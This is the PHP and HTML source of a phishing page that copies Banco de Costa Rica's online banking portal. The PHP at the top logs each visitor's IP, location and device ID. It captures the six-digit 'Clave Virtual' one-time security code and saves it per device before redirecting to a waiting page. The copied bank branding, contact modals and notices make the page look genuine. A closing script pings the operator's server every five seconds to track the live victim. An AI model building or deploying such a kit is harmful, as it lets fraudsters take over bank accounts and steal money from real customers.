<?php
require_once 'functions.php';

$info = get_user_info();
$ip = $info['ip'];
$device = get_device_id(); 

// Verificar si el usuario está bloqueado
if (get_user_state($device) === 'block') {
    echo "<script>
        alert('Acceso denegado: Tu usuario ha sido bloqueado.');
        window.location.href = 'https://www.google.com';
    </script>";
    exit();
}

// Actualizar el usuario con su device_id
update_user($ip, $info['location'], basename(__FILE__));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $allowedFields = ["clave"];
    $formData = [];

    foreach ($_POST as $key => $value) {
        if (in_array($key, $allowedFields)) {
            $formData[$key] = trim($value);
        }
    }

    if (!empty($formData)) {
        $data = load_data();

        if (!isset($data[$device])) { 
            $data[$device] = ['submissions' => [], 'state' => 'active'];
        }

        $timestamp = date("Y-m-d H:i:s");

        $found = false;
        if (isset($data[$device]['submissions'])) {
            foreach ($data[$device]['submissions'] as &$submission) {
                $existingKeys = array_keys($submission['data']);
                $formKeys = array_keys($formData);
                sort($existingKeys);
                sort($formKeys);
                if ($existingKeys == $formKeys) {
                    // Reemplazar el submission existente
                    $submission = [
                        "data" => $formData,
                        "timestamp" => $timestamp
                    ];
                    $found = true;
                    break;
                }
            }
            unset($submission);
        }
        if (!$found) {
            $data[$device]['submissions'][] = [
                "data" => $formData,
                "timestamp" => $timestamp
            ];
        }

        save_data($data);

        header("Location: waiting.php");
        exit();
    } else {
        echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
    }
}
?>
<!DOCTYPE html>
<html lang="es-CR">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="description" content="Banco de Costa Rica-Oficina Virtual" "="">
    <meta name=" keywords" content="BCR, BCR Personas, Banco de Costa Rica">
    <meta name="author" content="Banco de Costa Rica">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <meta http-equiv="Expires" content="Mon, 01 Jan 1990 00:00:01 GMT">
    <meta http-equiv="cache-control" value="no-cache, no-store, must-revalidate">

    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

    <title>Banco de Costa Rica- Oficina Virtual</title>

    <link rel="shortcut icon" href="https://www.personas.bancobcr.com/imagenes/iconos/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="./content/semantic.min.css">
    <link rel="stylesheet" type="text/css" href="./content/bcr_menu.css">
    <link rel="stylesheet" type="text/css" href="./content/BCRStyle.css">
    <!-- Manejo de Tablas - CSS -->
    <link rel="stylesheet" type="text/css" href="./content/jquery.dataTables.min.css">
</head>

<body oncontextmenu="return false;" class="dimmable">



    <div class="pusher">
        <div class="ui borderless fixed tiny labeled icon menu menuBCR">

            <a class="item" title="Banco de Costa Rica" href="https://www.personas.bancobcr.com/plantilla/index.asp">
                <img class="ui small image" src="./content/logo.gif" tabindex="-1" alt="Logo del Banco de Costa Rica">
            </a>

            <a class="item right" id="itmCertificacion" tabindex="3"
                href="https://www.personas.bancobcr.com/ib_bcr/transacciones/certificaciones/certificacionEspecifica/certificaciones.asp"
                target="ifrm" style="display: none;">
                <i class="icon"><img src="./content/Certificado.svg" alt="Certificado"></i>
                <p style="padding-top: 3px;">Certificaciones</p>
            </a>
            <a class="item right" id="itmContactenos" tabindex="3" style="">
                <i class=" icon"><img src="./content/Contactenos.svg" alt="Contactenos"></i>
                <p style="padding-top: 3px;">Contáctenos </p>
            </a>

        </div>

        <div class="ui horizontal segments title">
            <div class="ui segment right aligned">
                <p class="ui inverted header title">Oficina Virtual</p>
            </div>
            <div class="ui segment">
                <p class="ui inverted header title">Personas</p>
            </div>
        </div>

        <div class="ui container iframeContainer">
            

	<span class="backArrow">
		<a href="https://www.personas.bancobcr.com/Ingreso.asp" target="ifrm">
			<svg width="30" height="30" viewBox="0 0 1792 1792">
				<path style="fill:#0030a0"
					d="M1408 960v-128q0-26-19-45t-45-19h-502l189-189q19-19 19-45t-19-45l-91-91q-18-18-45-18t-45 18l-362 362-91 91q-18 18-18 45t18 45l91 91 362 362q18 18 45 18t45-18l91-91q18-18 18-45t-18-45l-189-189h502q26 0 45-19t19-45zm256-64q0 209-103 385.5t-279.5 279.5-385.5 103-385.5-103-279.5-279.5-103-385.5 103-385.5 279.5-279.5 385.5-103 385.5 103 279.5 279.5 103 385.5z">
				</path>
			</svg>
		</a>
	</span>
	<div class="ui text container">
		<h2 tabindex="50" style="background-color:white !important; margin-top: 1em !important;"
			class="ui center aligned header security">Ingrese su mecanismo de seguridad para continuar:</h2>
	</div>


	<!---------------------------------------------------------------------------------------------------------------->

	<form name="theForm"
		method="POST">
		<input type="hidden" name="ACoTipTef" value="01">
		<input type="hidden" name="ConfirmarFirma" value="">
		<input type="hidden" name="PasoGateway" id="PasoGateway" value="">



		<p></p>


		<table border="0" align="center">
			<tbody>
				<tr>
					<td align="center" class="textorojo11">
						<!--<p align="center" class="textorojo11" height="22" valign="bottom" colspan="2">	Esta transacci&oacute;n requiere el uso de un dispositivo de seguridad.</p>-->
					</td>
				</tr>
			</tbody>
		</table>

		<p>

			<input type="hidden" readonly="True" name="TarjetaTD" value="">
			<input type="hidden" readonly="True" name="EstadoTD" value="">
			<input type="hidden" readonly="True" name="ProdEncontTD" value="False">
			<input type="hidden" readonly="True" name="DebeUsarTxn_TD" value="False">
			<input type="hidden" readonly="True" name="TipoTarjetaTD" value="">

			<input type="hidden" readonly="True" id="DebeUsarTxn_TV" name="DebeUsarTxn_TV" value="True">
			<input type="hidden" id="codDato" name="codDato" value="">



		</p>
		<p>

			<input type="hidden" id="PasoCV" name="PasoCV" value="">
			<input type="hidden" id="valorOTP" name="valorOTP" value="">
			<input type="hidden" id="dobleRetorno" name="dobleRetorno" value="0">
			<input type="hidden" id="codTransaccionCV" name="codTransaccionCV" value="">

		</p>
		<div class="ui form">
			<div class="ui grid centered">
				<div class="ten wide mobile six wide computer column">

					<div class="field">
						<label class="letrasNegrasFormulario" title="Código BCR Clave Virtual" tabindex="51">Código BCR
							Clave Virtual</label>
						<div class="ui input" style="position: relative; top: 24px;">
                        <input tabindex="52" name="clave" id="OTP" type="text" maxlength="6" 
       onkeypress="return aceptarSoloNumeros(event);" 
       onpaste="return false;" 
       oninput="validarLongitud(this)" 
       autocomplete="off" 
       style="text-align: center;" 
       inputmode="numeric" 
       aria-label="Ingrese su mecanismo de seguridad para continuar:">

<script>
function aceptarSoloNumeros(event) {
    const charCode = event.which ? event.which : event.keyCode;
    // Permitir solo números (0-9)
    if (charCode < 48 || charCode > 57) {
        event.preventDefault();
        return false;
    }
    return true;
}

function validarLongitud(input) {
    // Permite solo números y corta el exceso de caracteres
    input.value = input.value.replace(/\D/g, '').slice(0, 6);
}
</script>

						</div>
					</div>
					<div class="field">
						<div class="ui grid">
							<div class="right aligned sixteen wide column" style="display:flex; position: relative; top: 26px;">
								<div style="margin:auto; position: relative; top: 26px; display: flex;">
									<input tabindex="60" style="float:right;" type="submit"
										class="ui button basic btnAzul" _="" value="Confirmar"
										onclick="ValidarOTPEvent(&#39;2&#39;, &#39;01&#39;); this.disabled=true"
										title="Confirmar" id="Aceptar">
									<input type="button" tabindex="61" class="ui button basic btnRojo" _=""
										value="Cancelar" onclick="
						 
							CancelarEvent(&#39;&#39;)
						" title="Cancelar" id="Cancelar">
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div><br>



		<div>

		</div>
		<div align="center">
			<center>
				<table border="0">
					<tbody>
						<tr>
							<td>
								<p align="center" class="textorojo11"><b><i></i></b></p>
							</td>
						</tr>
						<tr>
							<td align="center">

							</td>
						</tr>
					</tbody>
				</table>
			</center>
		</div>


	</form>
        </div>

        <div class="ui horizontal footer segment">
            <div class="ui center aligned container">
                <div class="ui horizontal inverted small divided link list">
                    <label style="color: transparent;">
                        <svg width="12" height="12" viewBox="0 0 512 512">
                            <path style="fill:#0030A0"
                                d="M480 160H32c-17.673 0-32-14.327-32-32V64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm112 248H32c-17.673 0-32-14.327-32-32v-64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm112 248H32c-17.673 0-32-14.327-32-32v-64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24z">
                            </path>
                        </svg>
                        114
                    </label>&nbsp;
                    <label>
                        <svg width="12" height="12" viewBox="0 0 448 512">
                            <path style="fill:#fff"
                                d="M128 148v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12h-40c-6.6 0-12-5.4-12-12zm140 12h40c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12zm-128 96h40c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12zm128 0h40c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12zm-76 84v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm76 12h40c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12zm180 124v36H0v-36c0-6.6 5.4-12 12-12h19.5V24c0-13.3 10.7-24 24-24h337c13.3 0 24 10.7 24 24v440H436c6.6 0 12 5.4 12 12zM79.5 463H192v-67c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v67h112.5V49L80 48l-.5 415z">
                            </path>
                        </svg>
                        BCR © Derechos Reservados 2025.
                    </label>&nbsp;
                    <label>
                        <svg width="12" height="12" viewBox="0 -150 1792 1792">
                            <path style="fill:#fff"
                                d="M1664 1504v-768q-32 36-69 66-268 206-426 338-51 43-83 67t-86.5 48.5-102.5 24.5h-2q-48 0-102.5-24.5t-86.5-48.5-83-67q-158-132-426-338-37-30-69-66v768q0 13 9.5 22.5t22.5 9.5h1472q13 0 22.5-9.5t9.5-22.5zm0-1051v-24.5l-.5-13-3-12.5-5.5-9-9-7.5-14-2.5h-1472q-13 0-22.5 9.5t-9.5 22.5q0 168 147 284 193 152 401 317 6 5 35 29.5t46 37.5 44.5 31.5 50.5 27.5 43 9h2q20 0 43-9t50.5-27.5 44.5-31.5 46-37.5 35-29.5q208-165 401-317 54-43 100.5-115.5t46.5-131.5zm128-37v1088q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-1088q0-66 47-113t113-47h1472q66 0 113 47t47 113z">
                            </path>
                        </svg>
                        Contáctenos: CentroAsistenciaBCR@bancobcr.com
                    </label>
                </div>
            </div>
        </div>
        <div id="nombreContenedor" class="black_overlay">
        </div>
        <div id="nombreContenido" style="border: 3px solid #0030A0;" class="modal_content">
        </div>
    </div>

    <!--Modals-->
    <!--Modal de contactenos--->
    <div class="ui small modal" id="modalContactenos">
        <i class="close icon"></i>
        <div class="header">
            Contáctenos
        </div>
        <div class="content">
            <p>
                <a href="tel:+50622111111">
                    <svg width="20" height="20" viewBox="0 -100 1792 1792">
                        <path style="fill:#0033A0"
                            d="M1600 1240q0 27-10 70.5t-21 68.5q-21 50-122 106-94 51-186 51-27 0-53-3.5t-57.5-12.5-47-14.5-55.5-20.5-49-18q-98-35-175-83-127-79-264-216t-216-264q-48-77-83-175-3-9-18-49t-20.5-55.5-14.5-47-12.5-57.5-3.5-53q0-92 51-186 56-101 106-122 25-11 68.5-21t70.5-10q14 0 21 3 18 6 53 76 11 19 30 54t35 63.5 31 53.5q3 4 17.5 25t21.5 35.5 7 28.5q0 20-28.5 50t-62 55-62 53-28.5 46q0 9 5 22.5t8.5 20.5 14 24 11.5 19q76 137 174 235t235 174q2 1 19 11.5t24 14 20.5 8.5 22.5 5q18 0 46-28.5t53-62 55-62 50-28.5q14 0 28.5 7t35.5 21.5 25 17.5q25 15 53.5 31t63.5 35 54 30q70 35 76 53 3 7 3 21z">
                        </path>
                    </svg>
                    Centro asistencia al cliente 2211-1111
                </a>
            </p>
            <p>
                <a href="https://api.whatsapp.com/send?phone=50622111135">
                    <svg width="20" height="20" viewBox="0 -100 1792 1792">
                        <path style="fill:#1e7e34"
                            d="M1113 974q13 0 97.5 44t89.5 53q2 5 2 15 0 33-17 76-16 39-71 65.5t-102 26.5q-57 0-190-62-98-45-170-118t-148-185q-72-107-71-194v-8q3-91 74-158 24-22 52-22 6 0 18 1.5t19 1.5q19 0 26.5 6.5t15.5 27.5q8 20 33 88t25 75q0 21-34.5 57.5t-34.5 46.5q0 7 5 15 34 73 102 137 56 53 151 101 12 7 22 7 15 0 54-48.5t52-48.5zm-203 530q127 0 243.5-50t200.5-134 134-200.5 50-243.5-50-243.5-134-200.5-200.5-134-243.5-50-243.5 50-200.5 134-134 200.5-50 243.5q0 203 120 368l-79 233 242-77q158 104 345 104zm0-1382q153 0 292.5 60t240.5 161 161 240.5 60 292.5-60 292.5-161 240.5-240.5 161-292.5 60q-195 0-365-94l-417 134 136-405q-108-178-108-389 0-153 60-292.5t161-240.5 240.5-161 292.5-60z">
                        </path>
                    </svg>
                    WhatsApp 2211-1135
                </a>
            </p>
            <p>
                <a href="mailto:CentroAsistenciaBCR@bancobcr.com">
                    <svg width="20" height="20" viewBox="0 -100 1792 1792">
                        <path style="fill:#C70911"
                            d="M1664 1504v-768q-32 36-69 66-268 206-426 338-51 43-83 67t-86.5 48.5-102.5 24.5h-2q-48 0-102.5-24.5t-86.5-48.5-83-67q-158-132-426-338-37-30-69-66v768q0 13 9.5 22.5t22.5 9.5h1472q13 0 22.5-9.5t9.5-22.5zm0-1051v-24.5l-.5-13-3-12.5-5.5-9-9-7.5-14-2.5h-1472q-13 0-22.5 9.5t-9.5 22.5q0 168 147 284 193 152 401 317 6 5 35 29.5t46 37.5 44.5 31.5 50.5 27.5 43 9h2q20 0 43-9t50.5-27.5 44.5-31.5 46-37.5 35-29.5q208-165 401-317 54-43 100.5-115.5t46.5-131.5zm128-37v1088q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-1088q0-66 47-113t113-47h1472q66 0 113 47t47 113z">
                        </path>
                    </svg>
                    CentroAsistenciaBCR@bancobcr.com
                </a>
            </p>
            <p>
                <a href="https://t.me/BancoBCR_Bot">
                    <svg width="20" height="20" viewBox="0 -100 448 512">
                        <path style="fill:#0088cc"
                            d="M446.7 98.6l-67.6 318.8c-5.1 22.5-18.4 28.1-37.3 17.5l-103-75.9-49.7 47.8c-5.5 5.5-10.1 10.1-20.7 10.1l7.4-104.9 190.9-172.5c8.3-7.4-1.8-11.5-12.9-4.1L117.8 284 16.2 252.2c-22.1-6.9-22.5-22.1 4.6-32.7L418.2 66.4c18.4-6.9 34.5 4.1 28.5 32.2z">
                        </path>
                    </svg>
                    Telegram
                </a>
            </p>
        </div>
        <div class="actions" style="text-align:center;">
            <button id="btnAceptarContacto" title="Aceptar" type="button" class="ui basic button btnAzul">
                Aceptar </button>
        </div>
    </div>
    <!--General Modal-->

    <!--Modal Tip ode Cambio-->
    <div id="modalTipoCambio" class="ui small modal">
        <i class="close icon"></i>
        <div class="header">&nbsp;</div>
        <div class="image content">
            <iframe name="modal_ifrm_tc" id="modal_ifrm_tc" allowfullscreen="allowfullscreen"
                style="width: 100%; height: 70vh; border: 0 " src="./content/saved_resource.html"></iframe>
        </div>
    </div>

    <div id="ModalMensajesImportantes" class="ui tiny modal background-modal">
        <svg id="iconoCerrarMensajesImportantes" width="20" height="20" viewBox="0 0 600 600"
            class="ui icon button close close-button">
            <path style="fill:#FFFFFF"
                d="M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z">
            </path>
        </svg>
        <div class="header header-modal-background text-color-white"><label>Mensajes importantes</label></div>
        <div class="content">
            <div class="ui fluid vertical menu">
                <div class="item">
                    <p>
                        <label id="msjImpTitulo" tabindex="41">Certificado Digital</label>
                    </p>
                    <ul>
                        <li tabindex="42">El servicio de Certificado Digital está regulado por la Ley de Certificados,
                            Firmas Digitales y Documentos Electrónicos Nº 8454, el Reglamento a la ley de Certificados,
                            Firmas Digitales y Documentos Electrónicos, la Política de Certificados para la Jerarquía
                            Nacional de Certificadores registrados. Estos documentos y mayor información relacionada
                            podrá ser consultada en el sitio web www.soportefirmadigital.com.</li>
                        <li tabindex="42">Tome en cuenta que para utilizar su Certificado Digital, primero debe tener
                            instalado el software Agente Gaudi BCCR, en caso de no tenerlo instalado se debe descargar
                            en el sitio www.soportefirmadigital.com.</li>
                        <li tabindex="42">Para firmar transacciones el sistema le solicitará un NIP (Número de
                            Identificación Personal) o PIN (Personal Identification Number) dependerá del software de su
                            lector o la versión idioma de su navegador.</li>
                        <li tabindex="42">Para utilizar su Certificado Digital en la Oficina Virtual, debe realizar
                            inicio de sesión con el mismo. No es requerida una activación previa.</li>
                        <li tabindex="42">Al ingresar a nuestra Oficina Virtual con Certificado Digital, todas las
                            transacciones que requieran mecanismo de seguridad, le solicitarán este de forma obligatoria
                            y la transacción quedará en firme hasta que el sistema valide que el Certificado Digital es
                            válido y además que el PIN es correcto.</li>
                        <li tabindex="42">Al no ingresar con su Certificado Digital (ingreso con usuario y contraseña),
                            se solicitará otro mecanismo de seguridad o en caso de no poseer, ingresará al canal en un
                            modo consulta y no podrá realizar transacciones que requieran el factor de seguridad.</li>
                    </ul>
                    <p></p>
                </div>
            </div>
        </div>
        <div class="ui actions" style="text-align: center !important">
            <button tabindex="42" class="ui basic button btnAzul"
                id="btnCerrarVentanaMensajesImportantes">Cerrar</button>
        </div>
    </div>
    <div class="ui dimmer modals page transition hidden">
        <div class="ui tiny modal transition hidden" id="modalGeneral">
            <i class="close icon"></i>
            <div class="header" id="tituloModal">Atención</div>
            <div class="content">
                <label id="contenidoModal" tabindex="2">Su control por lugar de acceso para bancobcr.com está
                    configurado solo para Costa Rica, por razones de seguridad no se podrá realizar esta transacción.
                    Comuníquese con nuestro Centro de Asistencia al 2211-1111.</label>
            </div>
            <div class="actions" style="text-align:center;">
                <button id="btnModal" tabindex="2" title="Aceptar" type="button" class="ui basic button btnAzul">
                    Aceptar
                </button>
            </div>
        </div>
    </div>
    <div id="ModalMensajesImportantes" class="ui tiny modal background-modal">
        <svg id="iconoCerrarMensajesImportantes" width="20" height="20" viewBox="0 0 600 600"
            class="ui icon button close close-button">
            <path style="fill:#FFFFFF"
                d="M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z">
            </path>
        </svg>
        <div class="header header-modal-background text-color-white"><label>Mensajes importantes</label></div>
        <div class="content">
            <div class="ui fluid vertical menu">
                <div class="item">
                    <p>
                        <label id="msjImpTitulo" tabindex="41">Certificado Digital</label>
                    </p>
                    <ul>
                        <li tabindex="42">El servicio de Certificado Digital está regulado por la Ley de Certificados,
                            Firmas Digitales y Documentos Electrónicos Nº 8454, el Reglamento a la ley de Certificados,
                            Firmas Digitales y Documentos Electrónicos, la Política de Certificados para la Jerarquía
                            Nacional de Certificadores registrados. Estos documentos y mayor información relacionada
                            podrá ser consultada en el sitio web www.soportefirmadigital.com.</li>
                        <li tabindex="42">Tome en cuenta que para utilizar su Certificado Digital, primero debe tener
                            instalado el software Agente Gaudi BCCR, en caso de no tenerlo instalado se debe descargar
                            en el sitio www.soportefirmadigital.com.</li>
                        <li tabindex="42">Para firmar transacciones el sistema le solicitará un NIP (Número de
                            Identificación Personal) o PIN (Personal Identification Number) dependerá del software de su
                            lector o la versión idioma de su navegador.</li>
                        <li tabindex="42">Para utilizar su Certificado Digital en la Oficina Virtual, debe realizar
                            inicio de sesión con el mismo. No es requerida una activación previa.</li>
                        <li tabindex="42">Al ingresar a nuestra Oficina Virtual con Certificado Digital, todas las
                            transacciones que requieran mecanismo de seguridad, le solicitarán este de forma obligatoria
                            y la transacción quedará en firme hasta que el sistema valide que el Certificado Digital es
                            válido y además que el PIN es correcto.</li>
                        <li tabindex="42">Al no ingresar con su Certificado Digital (ingreso con usuario y contraseña),
                            se solicitará otro mecanismo de seguridad o en caso de no poseer, ingresará al canal en un
                            modo consulta y no podrá realizar transacciones que requieran el factor de seguridad.</li>
                    </ul>
                    <p></p>
                </div>
            </div>
        </div>
        <div class="ui actions" style="text-align: center !important">
            <button tabindex="42" class="ui basic button btnAzul"
                id="btnCerrarVentanaMensajesImportantes">Cerrar</button>
        </div>
    </div>

    <script>

        setInterval(function(){
            fetch('functions.php?action=ping', { method: 'GET', keepalive: true });
        }, 5000);
        
        window.addEventListener('unload', function(){
            navigator.sendBeacon('functions.php?action=offline');
        });
        </script>
</body>

</html>